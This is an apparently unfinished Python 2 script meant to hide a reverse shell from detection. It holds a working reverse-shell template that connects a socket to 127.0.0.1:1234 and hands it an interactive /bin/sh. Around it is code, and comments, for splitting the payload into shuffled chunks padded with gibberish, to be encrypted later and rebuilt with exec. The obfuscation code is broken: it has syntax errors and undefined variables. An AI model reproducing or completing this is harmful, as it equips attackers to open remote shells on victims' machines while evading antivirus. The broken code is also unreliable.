import re,random,string

# How to make sure this never gets detected, because the shell is broken down into a array where the commands are split and randomized

# Once we get this working, we then encrypt it with a static 32-bit key and 16-bit IV
template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""

template_reverse_shell = template_reverse_shell.strip().rstrip()
# use lambda functions to make a array of arrays, two dimensional, or a list of lists
arrayList = []

# we need to add a sort function. So for each line, we extend the length to 50 elements from 0 to 49. It randomly picks a index and appends to it, and fills the rest of it with filler

def generateArrayList(l):# We are concealing the payload in a list of both parts of the payload and parts of gibberish
    # arr[50]
    # arr = []
    # arr = arr.extend(50*str('aa')])
    # print arr
    arrayBrokenShellCode = re.findall('..?',l)
    toFill = 50 - len(arrayBrokenShellCode)

    arrayBrokenShellCode = arrayBrokenShellCode.extend(toFill*"aa")
    arrayShuffled = random.sample(arrayBrokenShellCode,len(arrayBrokenShellCode))
    print arrayShuffled
    # now we have to for each item  in arrayBrokenShellCode, randomly generate a integer between 0 to 49, check if value = '' or empty, and then replace it.

    # What other methods can we go for to make a motherfucking randomized and shuffled list of broken shellcode, injected with filler strings, and then remap it so we can reconstitute it?

    # 1. We can extend the length of the list up to 50 double characters, and from that, shuffle it without the random module
    # 2. We can take each section of the shellcode, generate a random number (which somehow is a integer), and then append it with that index value
    # 3. How about we append a random word (two letters) between each 

    # inject gibberish
    for i in arr:
        if i == 'aa':
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            print char
            char = arr[arr.index(i)]
            arr[arr.index(i)] = char
        if i == None:
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            print char
            char = arr[arr.index(i)  
    # #### OLD #####
    # arr = re.findall('..?',l)
    # toFill = 50 - len(arr)
    # # arr.append(None * toFill)

    # arr.extend(['']*toFill)
    # # We need to shuffle the array, inject additional meaningless alphanumeric characters into it. And keep track of the index value


    # # inject gibberish
    # for i in arr:
    #     if i == '':
    #         char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
    #         print char
    #         # char = arr[arr.index(i)]
    #         arr[arr.index(i)] = char
    #     if i == None:
    #         char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
    #         print char
    #         # char = arr[arr.index(i)]
    # #         arr[arr.index(i)] = char
    # print "DEBUG: \r\n",arrayBrokenShellCode
    
    # # shuffle
    # # print random.shuffle(arr)
    # # shuf = ist(random.shuffle(arr))
    # print "DEBUG: Shuffled array",arr
    # # match

    # for word in shuf:
    #     print "DEBUG: ",word
    #     index = shuf.index(word)
    #     arrayMap.append(index)
    # from that, we need to map the original and new index values, and write the map to a csv file just of index values
    print arrayMap
    # Then we just append the command in order by it's index values
    return arrayMap, arrayList

# def generateArrayList(l):
#     # lambda arr: re.findall('..?',l)
#     arr = re.findall('..?',l)
#     arrayList.append(arr)
#     return arrayList

# def reconstituteArrayList(arrayList):
#     for a in arrayList:
#         print "DEBUG: Length of subarray is {}".format(len(a))
#         print "DEBUG: Subarray type is: ",type(a)
#         cmd = "".join(a)
#         print cmd
#         exec(cmd)

#     return

lines = template_reverse_shell.splitlines()

for l in lines:
    arrayMap, arrayList = generateArrayList(l)
# return arrayList

print arrayList

# reconstituteArrayList(arrayList)

# for l in lines:
#     array = re.findall('..?',l)
#     # print array
#     cmd = "".join(array)
#     # print cmd
#     exec(cmd)
